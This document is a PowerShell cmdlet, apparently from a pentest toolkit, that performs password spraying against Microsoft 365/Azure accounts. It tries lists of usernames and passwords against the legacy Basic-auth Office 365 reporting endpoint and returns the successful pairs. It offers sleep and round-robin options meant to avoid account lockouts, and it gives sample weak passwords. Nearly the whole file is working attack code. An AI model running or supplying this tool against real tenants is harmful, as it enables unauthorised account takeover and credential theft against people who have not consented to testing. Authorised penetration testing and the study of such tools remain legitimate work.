Function Invoke-AzurePasswordSpray {
<#
.SYNOPSIS
This cmdlet is used to perform a password spray attack against Azure accounts using legacy "Basic" Authentication


.DESCRIPTION
The cmldet performs a password spray attack against Azure using by default, basic authentication against the legacy Office365 reporting API. This script will currently not work if legacy authentication in Azure AD is blocked. The -Username or -UserFile parameters should contain a list of email addresses to test passwords against. Specify passwords to try with the -Passwd or -PassFile parameter. Use the -SleepSeconds and -RoundRobin parameters to prevent possible lock outs from too many failed attempts.


.PARAMETER UserName
Define a list of usernames or a single user to peform your password check against

.PARAMETER UserFile
Set the path location of a file containing a list of user names you wish to test against

.PARAMETER Passwd
Define a single password or ann array of passwords to try against your userlist

.PARAMETER PasswdFile
Set the path location of a file containing a list of passwords to try

.PARAMETER Authentication
Define the type of authentication used when attempting the password spray. This currently only supports Basic authentication. I plan to add modern authentication later on

.PARAMETER SleepSeconds
Define the number of seconds to wait before attempting the next password

.PARAMETER RoundRobin
This switch parameter indicates you wish to try a single password against each username before moving to the next value. The default execution tests each password against a username


.EXAMPLE
Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!'
# This Example tests the passwords defined against the list of usernames defined

.EXAMPLE
Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!' -SleepSeconds 60
# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt

.EXAMPLE
Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!' -SleepSeconds 60 -RoundRobin
# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt. This performs authentication attempts in a Round Robin fashion for the defined usernames

.EXAMPLE
$UserNames = "rob@domain.com","john@domain.com","dixie@domain.com","chris@domain.com"
$UserNames | Invoke-AzurePasswordSpray -Passwd "Password123!" -RoundRobin
# This Example tests the passwords defined against the list of usernames defined in a Round Robin fashion


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.String, System,Array


.OUTPUTS
PSCustomObject

#>
    [CmdletBinding(DefaultParameterSetName='Username')]
        param (
            [Parameter(
                ParameterSetName="Username",
                Position=0,
                Mandatory=$True,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$False,
                HelpMessage="`n[H] Enter a single username or multiple usernames using a comma to separate multiple values. The password(s) you set will be tested for these users. `n[E] EXAMPLE: 'robert.osborne','john.smith','dixie.normus' ")]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [String[]]$UserName,

            [Parameter(
                ParameterSetName="UserFile",
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the location of a simple text file containing a list of usernames`n[E] EXAMPLE: C:\Temp\Userlist.txt")]  # End Parameter
            [ValidateScript({Test-Path -Path $_})]
            [String[]]$UsernameFile,

            [Parameter(
                Position=1,
                Mandatory=$False,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the passwords you want checked against the users you defined`n[E] EXAMPLE: 'Password123!','asdf123!','W3lc0me!','dirkaDirka123!@#'")]  # End Parameter
            [String[]]$Passwd,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the location of a simple text file containing a list of passwords to spray`n[E] EXAMPLE: C:\Temp\PassList.txt")]  # End Parameter
            [ValidateScript({Test-Path -Path $_})]
            [String[]]$PasswdFile,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [ValidateSet('Basic','Modern')]
            [String]$Authentication = 'Basic',

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [Int64]$SleepSeconds,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [Switch][Bool]$RoundRobin)  # End param

BEGIN {

    $Obj = @()
    $UserList = @()
    $PasswdList = @()

    Switch ($Authentication) {

        'Basic' {

            $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"

        }  # End Switch Basic

        'Modern' {

            Throw "[!] I have not completed this yet so this will not work. Dynamic Parameter needs to be created for 'Modern' value"

            $DLLFile = (Get-ChildItem -Path "C:\Program Files\WindowsPowerShell\Modules\AzureAD" -Recurse -Filter 'Microsoft.IdentityModel.Clients.ActiveDirectory.dll').FullName
            Add-Type -Path $DLLFile

            $Cache = [Microsoft.IdentityModel.Clients.ActiveDirectory.TokenCache]::DefaultShared
            $Cache.ReadItems() | Select-Object -Property 'DisplayableId', 'Authority', 'ClientId', 'Resource'

            $AuthContext = New-Object -TypeName "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList https://login.microsoftonline.com/tenantname.onmicrosoft.com/
            $Client_id = "a0c73c16-a7e3-4564-9a95-2bdf47383716"

            If ($RoundRobin.IsPresent) {

                ForEach ($P in $PasswdList) {

                    ForEach ($U in $UserList) {

                        $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                        $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)

                        Try {

                            Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                            $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}

                        } Catch {

                            Write-Verbose -Message "$U authentication failed with password $P"

                        }  # End Try Catch

                        If ($PSBoundParameters.Keys -like "Sleep*") {

                            Start-Sleep -Seconds $SleepSeconds

                        }  # End If

                    }  #  End ForEach

                }  # End ForEach

            } Else {

                ForEach ($U in $UserList) {

                    ForEach ($P in $PasswdList) {

                        Try {

                            $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                            $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
                            $AADcredential = New-Object -TypeName "Microsoft.IdentityModel.Clients.ActiveDirectory.UserPasswordCredential" -ArgumentList $Cred.UserName,$Cred.Password
                            $AuthResult = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContextIntegratedAuthExtensions]::AcquireTokenAsync($AuthContext,"https://outlook.office365.com",$Client_Id,$AADcredential)

                            $Authorization = "Bearer {0}" -f $AuthResult.Result.AccessToken
                            $Password = ConvertTo-SecureString -AsPlainText $Authorization -Force
                            $Ctoken = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $U, $Password

                            $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}

                        } Catch {

                            Write-Verbose -Message "$U authentication failed with password $P"

                        }  # End Catch

                        If ($PSBoundParameters.Keys -like "Sleep*") {

                            Start-Sleep -Seconds $SleepSeconds

                        }  # End If

                    }  #  End ForEach

                }  # End ForEach

            }  # End Else

        }  # End Switch Modern

        Default { $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" }

    }  # End Switch

    Switch ($PSBoundParameters.Keys) {

        'Passwd' {

            Write-Verbose -Message "Passwd being used"
            [Array]$PasswdList = $Passwd

        }  # End Switch Passwd

        'PassFile' {

            Write-Verbose -Message "PassFile being used"

            $PassList = Get-Content -Path $PasswdFile
            ForEach ($P in $PassList) {

                $PasswdList += $P

            }  # End ForEach

        }  # End Switch PassFile

    }  # End Password Switch

    Write-Output -InputObject "[*] Begining password spray"

} PROCESS {

    Switch ($PSCmdlet.ParameterSetName) {

        'Username' {

            Write-Verbose -Message "Username ParameterSet being used"
            [Array]$UserList = $Username

        }  # End Switch Username

        'UserFile' {

            Write-Verbose -Message "UserFile ParameterSet being used"

            $Users = Get-Content -Path $UsernameFile
            ForEach ($User in $Users) {

                $UserList += $User

            }  # End ForEach

        }  # End Switch UserFile

    }  # End Switch

    If ($RoundRobin.IsPresent) {

        ForEach ($P in $PasswdList) {

            ForEach ($U in $UserList) {

                $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)

                Try {

                    Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                    $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}

                } Catch {

                    Write-Verbose -Message "$U authentication failed with password $P"

                }  # End Try Catch

                If ($PSBoundParameters.Keys -like "Sleep*") {

                    Start-Sleep -Seconds $SleepSeconds

                }  # End If

            }  #  End ForEach

        }  # End ForEach

    } Else {

        ForEach ($U in $UserList) {

            ForEach ($P in $PasswdList) {

                $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)

                Try {

                    Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                    $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}

                } Catch {

                    Write-Verbose -Message "$U authentication failed with password $P"

                }  # End Try Catch

                If ($PSBoundParameters.Keys -like "Sleep*") {

                    Start-Sleep -Seconds $SleepSeconds

                }  # End If

            }  #  End ForEach

        }  # End ForEach

    }  # End Else

} END {

    If ($Obj) {

        Return $Obj

    } Else {

        Write-Output -InputObject "[x] None of the user and password combinations defined were successful"

    }  # End If Else

}  # End END

}  # End Function Invoke-AzurePasswordSpray
